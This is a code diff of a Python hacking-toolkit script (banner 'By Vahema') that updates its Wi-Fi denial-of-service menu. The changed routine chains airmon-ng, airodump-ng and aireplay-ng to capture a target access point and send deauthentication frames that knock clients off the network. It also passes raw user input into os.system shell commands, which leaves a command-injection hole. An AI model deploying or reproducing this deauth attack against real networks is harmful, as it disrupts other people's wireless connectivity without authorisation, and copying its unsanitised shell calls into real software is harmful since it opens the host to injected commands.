@@ -1,3 +1,9 @@
+#########################
+#__ .     ¨   ~     . ¨ #
+#  \__  By Vahema    ___#
+#     \     ¨  .    /   #
+#########################
+
 import random, time as t, os, instaloader as il
 from colorama import Fore
 
@@ -7,7 +13,7 @@ fyellow = Fore.YELLOW
 fgreen = Fore.GREEN
 fwhite = Fore.WHITE
 
-ver = "1.9.1"
+ver = "1.9.2"
 
 def banner():
 	os.system("clear")
@@ -58,7 +64,7 @@ def clear():
 	banner()
 
 def dos():
-	def dos_menu()
+	def dos_menu():
 		print(f"""
 {fyellow}### DOS MENU ###
 
@@ -79,16 +85,18 @@ def dos():
 			if ui == "y" or ui == "Y":
 				pass
 			else:
+				print("")
 				dos_run = False
 
-			print(f"{fred}Note{fwhite} the BSSID, then you can close")
+			print(f"{fred}WRITE BSSID HERE, THEN CLOSE THE TERMINAL{fwhite}")
 			os.system("sudo xterm -e airmon-ng start wlan0")
 			os.system("sudo xterm -e airodump-ng wlan0mon")
-			deauth = int(input(f"Deauth : "))
-			bssid = input(f"Bssid : ")
-			channel = int(input("Channel : "))
+
+			bssid = input("Bssid : ")
+			deauth = input("Deauth : ")
+			channel = input("Channel : ")
 			print(f"\n{fred}CLOSE THE TERMINAL{fwhite}\n")
-			os.system(f"sudo xterm -e airodump-ng --bssid {bssid} --channel {channel} -w eminadam wlan0mon")
+			os.system(f"sudo xterm -e airodump-ng --bssid {bssid} --channel {channel} -w ./data/dos/eminadam wlan0mon")
 			os.system(f"sudo xterm -e aireplay-ng --deauth {deauth} -a {bssid} wlan0mon")
 			os.system("sudo airmon-ng stop wlan0mon")
 
